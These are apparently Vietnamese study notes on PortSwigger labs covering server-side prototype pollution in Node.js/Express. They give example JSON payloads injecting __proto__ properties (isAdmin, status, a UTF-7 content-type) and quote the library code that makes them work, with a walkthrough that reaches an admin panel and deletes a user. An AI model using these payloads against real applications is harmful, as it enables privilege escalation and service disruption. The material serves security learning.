- No source code access: sẽ không có quyền truy cập vào đoạn JS có chứa vuln, không có cách nào dễ dàng để có được cái nhìn tổng quan về các sinks đang có hoặc phát hiện ra các gadget properties
- Lack of developer tools: vì JS đang chạy trên một hệ thống từ xa, ta không có khả năng kiểm tra các objects tại thời điểm runtime, rất khó để biết khi nào ta đã pollute prototype thành công (đối với blackbox)
- DoS: pollute thành công các object trong server-side bằng các real properties thường làm hỏng chức năng của ứng dụng hoặc đánh sập hoàn toàn server. Vì rất dễ gây ra DoS
- Pollution persistence: khi kiểm thử trên browser, ta có thể đảo ngược mọi thay đổi của mình và có lại một môi trường sạch chỉ bằng cách refresh trang

## Detecting server-side prototype pollution via polluted property reflection
- `for...in`: khác với các ngôn ngữ khác, `for...in` của JS nó không chỉ lặp qua các thuộc tính riêng của Object đó, mà nó lội ngược lên tận `Object.prototype` để lôi tất cả các thuộc tính của cha me ra lặp cùng
- Những thuộc tính gốc của JS (như `toString`, `hasOwnProperty`) bị đánh dấu là `non-enumerable` nên vòng lặp sẽ bỏ qua, nhưng thuộc tính do hacker inject vào (VD: `__proto__.car = car`) mặc định là enumerable

![image](https://hackmd.io/_uploads/S1dkzc9cZl.png)

- Điều này cũng áp dụng cho array, nơi vòng lặp `for...in` trước tiên sẽ lặp qua từng index, về bản chất chỉ là một khóa thuộc tính dạng số ở bên dưới hệ thống, trước khi chuyển sang bất kỳ thuộc tính được kế thừa nào
![image](https://hackmd.io/_uploads/BymVz555Zx.png)

- request `POST` hoặc `PUT` gửi dữ liệu JSON đến một ứng dụng hoặc API là những method phổ biến cho việc này, vì các máy chủ thường response bằng một JSON của đối tượng mới hoặc đối tượng vừa được cập nhật
- Trong trường hợp này ta có thể cố gắng pollute `Object.prototype` toàn cục bằng một thuộc tính tùy ý như
```javascript!
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```
- Nếu trang web có vuln, thuộc tính ta inject vào sau đó sẽ xuất hiện trong đối tượng được cập nhật ở response
```javascript!
HTTP/1.1 200 OK
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```

- Không chỉ JSON, đôi khi server render luôn template chứa thuộc tính rác của ta, VD in thẳng ra file HTML `<div>Hello [thuộc tính rác]</div>`
- User ppdate: các API như `/update-profile`, `/settings`, `/edit-account` là nơi khai thác SSPP vì chức năng này buộc phải nhận một cục dữ liệu từ user  và merge nó vào Object User đang lưu trong RAM/database

**[LAB 6](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)**

![image](https://hackmd.io/_uploads/By1vw9qqZx.png)
- thấy khi gửi form thì dữ liệu từ các trường được gửi đến máy chủ dưới dạng JSON
![image](https://hackmd.io/_uploads/BkPOPcq9Wx.png)
- thêm một thuộc tính mới vào JSON với tên `__proto__`, chứa một đối tượng với một thuộc tính tùy ý
- Quan sát thấy response hiện đã bao gồm thuộc tính tùy ý mà vừa inject vào, nhưng không có thuộc tính `__proto__` => pollute thành công prototype của đối tượng và thuộc tính của đã được kế thừa qua chuỗi nguyên mẫu
![image](https://hackmd.io/_uploads/rkhpKc5c-l.png)
- Thấy thuộc tính `isAdmin` đang được đặt là `false`
- Sửa đổi request để thử pollute prototype bằng thuộc tính `isAdmin`
- Gửi request thấy giá trị `isAdmin` trong response đã được update thành `true` => đối tượng không có thuộc tính `isAdmin` của riêng nó, mà thay vào đó đã kế thừa nó từ prototype bị pollute
![image](https://hackmd.io/_uploads/H1Wx5595Zg.png)
- refresh trang và thấy ta có thể truy cập admin panel
- tới admin panel và xóa `carlos`
![image](https://hackmd.io/_uploads/HJS-5q95bl.png)
![image](https://hackmd.io/_uploads/S1Ab9c99Ze.png)

## Detecting server-side prototype pollution without polluted property reflection
- 3 kỹ thuật để test mù
    - Status Code Override: Express thường dùng một biến `status` trong các error object. Nếu ta pollute `Object.prototype.status = 510`, và khi ứng dụng gặp một lỗi nhỏ (ví dụ lỗi parse JSON), thay vì trả về `400 Bad Request`, nó lại trả về `510 Not Extended`
    - JSON Spaces Override: Express có một tùy chọn `app.set('json spaces', 2)` để làm đẹp file JSON. Nếu dev không set, mặc định nó không có khoảng trắng. Ta pollute `Object.prototype['json spaces'] = 10`, mọi response JSON từ server đều bị thụt lề `10 space`
    - Charset Override: ép server thay đổi `Content-Type: application/json; charset=utf-8` thành một bộ mã kỳ lạ nào đó mà ta tự định nghĩa

### Status code override
```javascript!
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```
- Module `http-errors` là thư viện nền tảng mà Express.js sử dụng để văng lỗi
- Biểu thức `err.status || err.statusCode || status` là một sink kinh điển. Nếu dev không định nghĩa `err.status`, JS Engine sẽ lội ngược lên `Object.prototype.status` để lấy giá trị
- Ta không thể truyền bừa bãi, source code ép buộc status phải thỏa mãn 2 điều kiện
    - Phải là số (`typeof status === 'number'`)
    - Phải nằm trong khoảng từ `400` đến `599`

### Charset override
```javascript!
var charset = getCharset(req) || 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```
- Khi gửi request có `Header Content-Type: application/json`, thư viện `body-parser` sẽ cố tìm xem ta đang dùng bảng mã gì (ví dụ `UTF-8`) để dịch cái body đó sang mã máy. Nó đọc trong thuộc tính `parameters.charset`
- Nếu trong Header của ta không ghi rõ charset (chỉ ghi mỗi `application/json`), `parameters.charset` sẽ bị bỏ trống. Thay vì văng lỗi, JS lội ngược dòng lên `Object.prototype.charset` để tìm

- Thêm một chuỗi được mã hóa UTF-7 tùy ý vào một thuộc tính được phản chiếu trong response. VD chữ `foo` trong UTF-7 là `+AGYAbwBv-`
```jsonld!
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```
- Gửi request, server sẽ không sử dụng mã hóa UTF-7 theo mặc định, nên chuỗi này sẽ xuất hiện trong response ở dạng vẫn đang bị mã hóa
- Thử pollute prototype bằng một thuộc tính `content-type` chỉ định rõ ràng bộ mã hóa ký tự UTF-7
```jsonld!
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```
- Gửi lại request đầu tiên. Nếu ta đã pollute prototype thành công, chuỗi UTF-7 bây giờ sẽ được decode trong response
```jsonld!
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```

```javascript!
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Bỏ qua các header trùng lặp (Drop duplicates)
        dest[field] = value;
    }
}
```
- Lỗi của Node.js nằm ở file `_http_incoming.js`, phụ trách việc phân tích HTTP Request thô thành các Object trong bộ nhớ
- Chuẩn HTTP không cho phép gửi 2 header `Content-Type` cùng lúc. Nên Node.js dùng lệnh `if (dest[field] === undefined)` để đảm bảo nếu header này chưa có ai ghi nhận, thì mới lưu vào bộ nhớ. Nếu có rồi thì vứt cái mới đi
- `=== undefined`: vì `dest` là một Object, lệnh gọi `dest['content-type']` sẽ tự động lội ngược lên prototype. Nếu hacker đã pollute `__proto__['content-type'] = 'utf-7'`, thì giá trị này trả về chuỗi đó ,tức là khác `undefined`
=> Node.js cho rằng header `Content-Type` đã được gửi trước đó, Thế là nó tự động vứt bỏ cái header thật do chính trình duyệt của user , và dùng luôn cái Header rác nằm trong prototype

**[LAB 7](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)**

- thêm thuộc tính __proto__ chứa một đối tượng với thuộc tính tùy ý
- Gửi request, thấy đối tượng trong response không phản chiếu thuộc tính vừa tiêm => điều này không nhất thiết có nghĩa là ứng dụng không có lỗ hổng
![image](https://hackmd.io/_uploads/BJ-Ifo59Ze.png)
- Trong request, sửa đổi JSON theo cách cố tình làm hỏng cú pháp., như xóa một dấu phẩy ở cuối một trong các dòng
![image](https://hackmd.io/_uploads/HJytzic9-x.png)
- nhận được response lỗi `500`, đối tượng lỗi lại chứa một thuộc tính `status` với giá trị `400`
- Trong request thực hiện các thay đổi sau
    - sửa lại cú pháp JSON bằng cách đảo ngược các thay đổi đã gây ra lỗi.
    - sửa đổi thuộc tính ta inject vào để thử pollute prototype bằng thuộc tính status của riêng ta
- Gửi request và thấy nhận được phản hồi bình thường chứa đối tượng người dùng của ta
![image](https://hackmd.io/_uploads/HJ0AMo5qbx.png)
- làm hỏng cú pháp JSON một lần nữa và gửi lại request
- Thấy rằng trả về lỗi `555` do ta inject vào => solved
![image](https://hackmd.io/_uploads/ryJx7jc5Zx.png)






























# [Một CTF challenge về Prototype Pollution](https://github.com/dotamduc/Prototype-Pollute.git)










